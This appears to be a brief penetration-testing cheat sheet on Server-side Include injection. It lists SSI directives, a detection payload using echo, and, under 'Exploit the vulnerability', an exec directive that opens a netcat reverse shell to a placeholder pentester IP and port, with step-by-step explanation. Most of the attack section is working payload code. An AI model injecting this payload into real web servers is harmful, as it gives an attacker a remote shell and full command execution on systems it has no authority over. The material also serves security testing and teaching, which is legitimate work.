# Server-side Include Injection

## SSI Directives
- Date: <!--#echo var="DATE_LOCAL" -->
- Modification date of a file: <!--#flastmod file="index.html" -->
- CGI Program results: <!--#include virtual="/cgi-bin/counter.pl" -->
- Including a footer: <!--#include virtual="/footer.html" -->
- Executing commands: <!--#exec cmd="ls" -->
- Setting variables: <!--#set var="name" value="Rich" -->
- Including virtual files (same directory): <!--#include virtual="file_to_include.html" -->
- Including files (same directory): <!--#include file="file_to_include.html" -->
- Print all variables: <!--#printenv -->

## Identify the vulnerability
- Use the SSI directives as payload. If the expected values are returned, the application is vulerable.
```bash
<!--#echo var="DATE_LOCAL" -->
```

## Exploit the vulnerability
- Confirm the vulnerability with the payload
```
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

	- mkfifo /tmp/foo: Create FIFO special file.
	- nc <IP> <PORT> 0</tmp/foo: Connect to the pentester machine, redirect standard input.
	- | bin/bash 1>/tmp/foo: Execute /bin/bash, redirect standard output to /tmp/foo.
	- rm /tmp/foo: Cleanup FIFO file.
```
- Set up the Netcat listener on the attacking machine and there should be a connection.


